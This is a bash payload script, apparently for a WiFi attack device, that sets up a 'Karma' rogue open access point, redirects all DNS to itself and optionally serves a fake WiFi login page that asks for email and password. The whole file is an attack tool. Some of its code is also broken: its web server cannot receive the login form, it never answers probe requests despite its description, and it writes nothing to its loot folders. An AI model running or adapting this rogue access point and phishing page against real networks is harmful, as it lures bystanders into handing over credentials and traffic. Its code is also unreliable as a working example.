#!/bin/bash
# Title: NullSec Karma Attack
# Author: bad-antics
# Description: Rogue AP that responds to all probe requests
# Category: nullsec

LOOT_DIR="/mmc/nullsec"
mkdir -p "$LOOT_DIR"/{karma,creds,logs}

PROMPT "NULLSEC KARMA ATTACK

Rogue AP attack that responds
to client probe requests.

Captures credentials via
captive portal.

Press OK to configure."

# Need both interfaces
if [ ! -d "/sys/class/net/wlan0" ]; then
    ERROR_DIALOG "wlan0 not found!
    
Need wlan0 for AP mode."
    exit 1
fi

# SSID for open AP
SSID=$(TEXT_PICKER "AP SSID name:" "FreeWiFi")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SSID="FreeWiFi" ;; esac

# Channel
CHANNEL=$(NUMBER_PICKER "WiFi channel (1-11):" 6)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CHANNEL=6 ;; esac
[ $CHANNEL -lt 1 ] && CHANNEL=1
[ $CHANNEL -gt 11 ] && CHANNEL=11

# Duration  
DURATION=$(NUMBER_PICKER "Duration (seconds):" 300)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=300 ;; esac
[ $DURATION -lt 60 ] && DURATION=60

# Captive portal?
PORTAL=""
resp=$(CONFIRMATION_DIALOG "Enable captive portal?

Redirects clients to fake
login page to capture creds.")
[ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ] && PORTAL="1"

resp=$(CONFIRMATION_DIALOG "Start Karma Attack?

SSID: $SSID
Channel: $CHANNEL
Duration: ${DURATION}s
Portal: $([ -n "$PORTAL" ] && echo YES || echo NO)

WARNING: This creates a
rogue access point!")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

# Stop conflicting services
killall hostapd dnsmasq 2>/dev/null

# Configure AP
LOG "Starting rogue AP..."

cat > /tmp/karma_hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
wpa=0
EOF

# Start hostapd
hostapd /tmp/karma_hostapd.conf &
HOSTAPD_PID=$!
sleep 2

# Configure IP
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up

# Start DHCP
cat > /tmp/karma_dnsmasq.conf << EOF
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,12h
address=/#/10.0.0.1
EOF

dnsmasq -C /tmp/karma_dnsmasq.conf &
DNSMASQ_PID=$!

# Simple credential logger
if [ -n "$PORTAL" ]; then
    # Create simple portal page
    mkdir -p /tmp/portal
    cat > /tmp/portal/index.html << 'HTML'
<!DOCTYPE html>
<html>
<head><title>WiFi Login</title></head>
<body style="font-family:Arial;text-align:center;padding:50px;">
<h1>WiFi Login Required</h1>
<form method="POST" action="/login">
<input name="email" placeholder="Email" style="padding:10px;margin:5px;"><br>
<input name="password" type="password" placeholder="Password" style="padding:10px;margin:5px;"><br>
<button style="padding:10px 30px;">Login</button>
</form>
</body></html>
HTML
    
    # Start simple HTTP server (if python available)
    if command -v python3 >/dev/null 2>&1; then
        cd /tmp/portal && python3 -m http.server 80 &
        HTTP_PID=$!
    fi
fi

LOG "Karma AP active: $SSID"

# Monitor for duration
sleep $DURATION

# Cleanup
kill $HOSTAPD_PID $DNSMASQ_PID $HTTP_PID 2>/dev/null
killall hostapd dnsmasq 2>/dev/null

# Count connections
CLIENTS=$(cat /tmp/dnsmasq.leases 2>/dev/null | wc -l || echo 0)

PROMPT "KARMA ATTACK COMPLETE

SSID: $SSID
Clients connected: $CLIENTS

Check logs in:
$LOOT_DIR/karma/

Press OK to exit."
